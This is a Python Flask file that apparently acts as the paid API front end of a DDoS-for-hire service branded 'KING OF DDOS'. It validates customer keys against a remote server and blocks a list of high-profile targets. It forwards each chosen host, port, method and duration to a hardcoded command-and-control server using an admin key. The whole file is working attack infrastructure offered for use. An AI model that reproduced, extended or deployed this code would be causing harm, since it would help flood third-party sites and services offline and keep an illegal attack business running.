from flask import Flask, request, jsonify
import threading
import requests

app = Flask(__name__)

API_KEY_CHECK_URL = "https://code-sanbox.000webhostapp.com/ADMIN/key.php?key="

def validate_api_key(key):
    try:
        response = requests.get(API_KEY_CHECK_URL + key)
        if response.status_code == 200 and response.json().get("Status") == "success":
            return True, response.json().get("key")
    except requests.RequestException:
        pass
    return False, None

def authenticate_key(func):
    def wrapper(*args, **kwargs):
        key = request.args.get("key")
        is_valid, key_info = validate_api_key(key)
        if not is_valid:
            return jsonify({"error": "Invalid API key"}), 403
        return func(*args, key_info=key_info, **kwargs)
    return wrapper

def perform_attack(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(f"Request to {url} succeeded")
            print(response.text)
            return response.text
        else:
            print(f"Request to {url} failed with status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Request to {url} failed: {e}")
    return None

@app.route('/api', methods=['GET'])
@authenticate_key
def execute_tool(key_info):
    try:
        methods = request.args.get('methods', 'Methods')
        host = request.args.get('host', '')
        time = request.args.get('time', '')
        port = request.args.get('port', '')

        invalid_host = ["dstat.cc", "https://dstat.cc", "https://dstat.cc/", "https://www.fbi.gov/", "www.fbi.gov", "fbi.gov", "https://www.fbi.gov", "https://chinhphu.vn", "https://ngocphong.com", "https://virustotal.com", "https://cloudflare.com", "https://check-host.cc/", "https://check-host.net/", "https://open.spotify.com", "https://snapchat.com", "https://usa.gov", "https://fbi.gov", "https://nasa.gov", "https://google.com", "https://translate.google.com", "https://github.com", "https://youtube.com", "https://facebook.com", "https://chat.openai.com", "https://shopee.vn", "https://mail.google.com", "https://tiktok.com", "https://instagram.com", "https://twitter.com", "https://telegram.org"]
        if host in invalid_host:
            return jsonify({"Status": "error", "Noti": "Playing stupid, kid"}), 400

        if not (methods and host and time and port):
            return jsonify({"Status": "error", "Noti": "Please enter complete information"}), 400

        valid_methods = ["PROXY", "HTTP", "HTTPS", "DSTAT"]
        if methods not in valid_methods:
            return jsonify({"Status": "error", "Noti": "Method does not exist or is missing, please re-enter"}), 400

        if int(time) > 200:
            return jsonify({"Status": "error", "Noti": "time max 200s"}), 400

        url = f'http://103.56.5.148:1337/api?key=admin&target={host}&port={port}&method={methods}&duration={time}'
       # url2 = f'http://103.56.5.148:1337/api?key=admin&target={host}&port={port}&method={methods}&duration={time}s'

        result1 = perform_attack(url)
      #  result2 = perform_attack(url2)

        result = {
            'Status': 'Success',
            'Time': time,
            'Attack': host,
            'Methods': methods,
            'Owner': 'KING OF DDOS',
            'Key': key_info,
            'ConC-1-Response': result1,
            #'ConC-2-Response': result2
        }

        # Tr? v? JSON response tr?c ti?p
        return jsonify(result)

    except Exception as e:
        print(e)
        return jsonify({'error': 'error'}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8056, debug=True)
